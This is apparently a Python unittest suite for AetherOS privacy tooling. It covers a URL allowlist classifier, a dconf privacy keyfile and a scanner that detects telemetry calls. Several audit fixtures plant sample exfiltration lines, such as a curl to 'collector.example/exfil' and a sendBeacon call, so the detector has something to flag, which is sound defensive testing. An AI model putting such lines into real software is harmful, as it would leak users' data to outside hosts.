"""Tests for the AetherOS no-telemetry enforcement workstream.

Run: python -m unittest discover -s aetheros/tests -p 'test_privacy.py' -v
"""

from __future__ import annotations

import configparser
import json
import pathlib
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from core.privacy.audit import MAX_FILE_BYTES, MAX_FILES, scan_sources  # noqa: E402
from core.privacy.policy import (  # noqa: E402
    ALLOWED_ENDPOINTS,
    PRIVACY_KEYS,
    audit_finding,
    classify_url,
    render_dconf_keyfile,
)

SCRIPT = ROOT / "scripts" / "aether-privacy.sh"
DCONF_KEYFILE = (
    ROOT / "iso" / "config" / "includes.chroot" / "etc" / "dconf"
    / "db" / "aether.d" / "00-aether-privacy"
)
AV_DEFS_URL = (
    "https://github.com/diamantmuqici-dotcom/AetherOS/releases/"
    "latest/download/aether-av-sigs.json"
)
PRIVACY_SCHEMA = "org/gnome/desktop/privacy"
LOCATION_SCHEMA = "org/gnome/system/location"


def _find_bash() -> str | None:
    found = shutil.which("bash")
    if found:
        return found
    for candidate in (
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files\Git\usr\bin\bash.exe",
    ):
        if pathlib.Path(candidate).is_file():
            return candidate
    return None


BASH = _find_bash()


def _posix(path: pathlib.Path) -> str:
    """Convert a host path to the form Git Bash accepts as an argv element."""
    text = str(path).replace("\\", "/")
    if len(text) > 1 and text[1] == ":":
        text = "/" + text[0].lower() + text[2:]
    return text


class ClassifyUrlTests(unittest.TestCase):
    def test_http_scheme_rejected(self) -> None:
        self.assertEqual(
            classify_url("http://github.com/aether-av-sigs.json"),
            (False, "", "scheme-not-https"),
        )

    def test_ip_literal_host_rejected(self) -> None:
        for url in ("https://127.0.0.1/collect", "https://[::1]/collect"):
            with self.subTest(url=url):
                allowed, purpose, reason = classify_url(url)
                self.assertFalse(allowed)
                self.assertEqual(purpose, "")
                self.assertEqual(reason, "ip-literal-host")

    def test_userinfo_rejected(self) -> None:
        self.assertEqual(
            classify_url("https://user:secret@github.com/repo"),
            (False, "", "userinfo-forbidden"),
        )

    def test_nonstandard_port_rejected(self) -> None:
        self.assertEqual(
            classify_url("https://github.com:8443/repo"),
            (False, "", "nonstandard-port"),
        )

    def test_subdomain_of_allowlisted_host_allowed(self) -> None:
        allowed, purpose, reason = classify_url("https://api.github.com/releases/latest")
        self.assertTrue(allowed)
        self.assertEqual(purpose, dict(ALLOWED_ENDPOINTS)["github.com"])
        self.assertEqual(reason, "ok")

    def test_unknown_host_denied(self) -> None:
        self.assertEqual(
            classify_url("https://telemetry.example/v1/beat"),
            (False, "", "host-not-allowlisted"),
        )

    def test_av_endpoint_allowed(self) -> None:
        allowed, purpose, reason = classify_url(AV_DEFS_URL)
        self.assertTrue(allowed)
        self.assertIn("AV definitions", purpose)
        self.assertEqual(reason, "ok")

    def test_explicit_and_default_443_are_equal(self) -> None:
        self.assertTrue(classify_url("https://github.com:443/x")[0])
        self.assertTrue(classify_url("https://github.com/x")[0])

    def test_host_is_case_insensitive(self) -> None:
        self.assertTrue(classify_url("https://DUCKDUCKGO.com/")[0])


class DconfTests(unittest.TestCase):
    def test_render_parses_with_configparser(self) -> None:
        parser = configparser.ConfigParser(interpolation=None)
        parser.read_string(render_dconf_keyfile())
        self.assertTrue(parser.has_section(LOCATION_SCHEMA))
        self.assertTrue(parser.has_section(PRIVACY_SCHEMA))
        self.assertEqual(parser.get(LOCATION_SCHEMA, "enabled"), "false")
        for key in (
            "send-software-usage-stats",
            "report-technical-problems",
            "recent-files-enabled",
        ):
            with self.subTest(key=key):
                self.assertEqual(parser.get(PRIVACY_SCHEMA, key), "false")
        for key in ("remove-old-temp-files", "remove-old-trash-files"):
            with self.subTest(key=key):
                self.assertEqual(parser.get(PRIVACY_SCHEMA, key), "true")

    def test_privacy_keys_are_gvariant_booleans(self) -> None:
        self.assertEqual(
            [(s, k, v) for s, k, v in PRIVACY_KEYS if v not in ("true", "false")],
            [],
        )
        self.assertIn((LOCATION_SCHEMA.replace("/", "."), "enabled", "false"), PRIVACY_KEYS)

    def test_shipped_keyfile_matches_renderer(self) -> None:
        self.assertTrue(DCONF_KEYFILE.is_file(), f"missing {DCONF_KEYFILE}")
        self.assertEqual(
            DCONF_KEYFILE.read_bytes(),
            render_dconf_keyfile().encode("utf-8"),
        )
        self.assertNotIn(b"\r", DCONF_KEYFILE.read_bytes())

    def test_audit_finding_shape(self) -> None:
        self.assertEqual(
            audit_finding("HIGH", "app.py", "1: hit [kind:HIGH:reason]"),
            {
                "severity": "HIGH",
                "path": "app.py",
                "evidence": "1: hit [kind:HIGH:reason]",
            },
        )


class AuditTests(unittest.TestCase):
    def test_planted_telemetry_fixture_detected(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            (root / "app.py").write_text(
                "location = navigator.geolocation\n"
                "navigator.sendBeacon('https://collector.example/beat')\n"
                "curl http://collector.example/exfil\n",
                encoding="utf-8",
            )
            findings = scan_sources(root)
        severities = {item["severity"] for item in findings}
        self.assertIn("HIGH", severities)
        self.assertIn("MEDIUM", severities)
        self.assertTrue(all(item["path"] == "app.py" for item in findings))
        evidence = " ".join(item["evidence"] for item in findings)
        self.assertIn("navigator.geolocation", evidence)
        self.assertIn("sendBeacon", evidence)
        self.assertIn("curl", evidence)

    def test_clean_fixture_reports_zero(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            (root / "clean.py").write_text(
                "def add(a, b):\n    return a + b\n", encoding="utf-8"
            )
            self.assertEqual(scan_sources(root), [])

    def test_allowlisted_network_call_is_info(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            (root / "av.py").write_text(
                "urllib.request.urlopen('https://github.com/aether-av-sigs.json')\n",
                encoding="utf-8",
            )
            findings = scan_sources(root)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["severity"], "INFO")
        self.assertIn("allowlisted:github.com", findings[0]["evidence"])

    def test_default_skip_dirs_are_ignored(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            tests = root / "tests"
            tests.mkdir()
            (tests / "fixture.py").write_text(
                "curl http://collector.example/beat\n", encoding="utf-8"
            )
            self.assertEqual(scan_sources(root), [])
            self.assertTrue(scan_sources(root, skip_dirs=()))

    def test_deterministic_ordering(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            for name in ("b.py", "a.py"):
                (root / name).write_text(
                    "navigator.geolocation\ncurl http://collector.example/x\n",
                    encoding="utf-8",
                )
            first = scan_sources(root)
            second = scan_sources(root)
        self.assertEqual(first, second)
        self.assertEqual([item["path"] for item in first], ["a.py", "a.py", "b.py", "b.py"])

    def test_bounds_are_declared(self) -> None:
        self.assertEqual(MAX_FILES, 20_000)
        self.assertEqual(MAX_FILE_BYTES, 8 * 1024 * 1024)


@unittest.skipUnless(BASH, "bash not available")
class CliTests(unittest.TestCase):
    def _run(self, args: list[str]) -> subprocess.CompletedProcess:
        return subprocess.run(
            [BASH, _posix(SCRIPT), *args],
            capture_output=True, text=True, timeout=60, check=False,
        )

    def test_script_has_no_dynamic_execution(self) -> None:
        text = SCRIPT.read_text(encoding="utf-8")
        self.assertNotIn("shell=true", text)
        self.assertNotIn("eval(", text)
        self.assertIn("set -euo pipefail", text)

    def test_version_flag(self) -> None:
        result = self._run(["--version"])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("aether-privacy", result.stdout)

    def test_check_json_shape(self) -> None:
        result = self._run(["--check"])
        self.assertEqual(result.returncode, 0, result.stderr)
        report = json.loads(result.stdout)
        self.assertEqual(
            set(report),
            {"privacy_keys", "allowlist", "dconf", "audit"},
        )
        self.assertEqual(report["privacy_keys"], len(PRIVACY_KEYS))
        self.assertEqual(
            [item["host"] for item in report["allowlist"]],
            [host for host, _ in ALLOWED_ENDPOINTS],
        )
        self.assertEqual(
            set(report["dconf"]),
            {"target", "present", "matches_policy"},
        )
        audit = report["audit"]
        self.assertEqual(
            set(audit),
            {"scanned_root", "count", "by_severity", "findings"},
        )
        self.assertIsInstance(audit["findings"], list)
        self.assertEqual(audit["count"], len(audit["findings"]))
        self.assertTrue({"INFO", "MEDIUM", "HIGH"} <= set(audit["by_severity"]))
        self.assertEqual(sum(audit["by_severity"].values()), audit["count"])

    def test_audit_json_shape(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            result = self._run(["--audit", _posix(pathlib.Path(tmp))])
        self.assertEqual(result.returncode, 0, result.stderr)
        report = json.loads(result.stdout)
        self.assertEqual(set(report), {"root", "count", "findings"})
        self.assertEqual(report["count"], 0)
        self.assertEqual(report["findings"], [])

    def test_apply_fails_closed_without_force(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            target = pathlib.Path(tmp) / "00-aether-privacy"
            target.write_text("sentinel\n", encoding="utf-8")
            result = self._run(["--apply", "--dest", _posix(target)])
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("refusing to overwrite", result.stderr)
            self.assertEqual(target.read_text(encoding="utf-8"), "sentinel\n")

    def test_apply_writes_rendered_keyfile_and_force_overwrites(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            target = pathlib.Path(tmp) / "00-aether-privacy"
            first = self._run(["--apply", "--dest", _posix(target)])
            self.assertEqual(first.returncode, 0, first.stderr)
            self.assertEqual(target.read_bytes(), render_dconf_keyfile().encode("utf-8"))
            target.write_text("tampered\n", encoding="utf-8")
            second = self._run(["--apply", "--dest", _posix(target), "--force"])
            self.assertEqual(second.returncode, 0, second.stderr)
            self.assertEqual(target.read_bytes(), render_dconf_keyfile().encode("utf-8"))


if __name__ == "__main__":
    unittest.main()
